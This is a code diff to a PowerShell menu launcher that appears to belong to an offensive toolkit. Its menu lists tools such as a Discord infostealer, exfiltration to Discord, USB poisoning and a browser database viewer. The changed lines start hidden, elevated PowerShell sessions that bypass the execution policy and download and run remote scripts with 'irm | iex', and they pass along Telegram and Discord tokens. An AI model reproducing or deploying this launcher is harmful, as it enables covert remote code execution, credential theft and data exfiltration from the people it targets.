@@ -62,7 +62,7 @@ $list = "=======================================================================
 = 11. Webhook Spammer                      31. USB Poison                    =
 = 12. Social Search                        32. Browser DB Files Viewer       =
 = 13. GDI effects                                                            =
-= 14. Mouse Recorder                       Discord Scripts                   =  
+= 14. Mouse Recorder                       Discord Scripts                   =
 = 15. System Metrics                       33. Discord Infostealer           =
 = 16. PoSh Control (tray)                  34. Exfiltrate to Discord         =
 =                                          35. PS Trascription to Discord    =
@@ -161,8 +161,6 @@ $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
         if ($Option){
 
             if ($Option -eq '00'){Write-Host "Entering Token and URL setup.." -ForegroundColor Yellow;sleep 1;EnterTokens;break}
-
-            $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
             
             if ($Option -eq '31'){
                 if ($DLurl.Length -eq 0){$DLurl = Read-Host "Enter a Direct Download File URL";Write-Host "File URL Set." -ForegroundColor Green}
@@ -170,6 +168,13 @@ $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
                 break
             }
 
+            if (($Option -eq '4') -or ($Option -eq '30') -or ($Option -eq '32') -or ($Option -eq '16')){
+                Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -W Hidden -C `$DLurl = `'$DLurl`' ; irm $url | iex") -Verb RunAs
+                break
+            }
+
+
+            $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
             If ($hidden -eq 'y'){
                 Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ; `$tk = `'$tk`' ; `$dc = `'$dc`' ; `$ch = `'$ch`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
                 break
@@ -188,8 +193,6 @@ $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
             break
         }
         break
-
     }
 sleep 1
 }
-
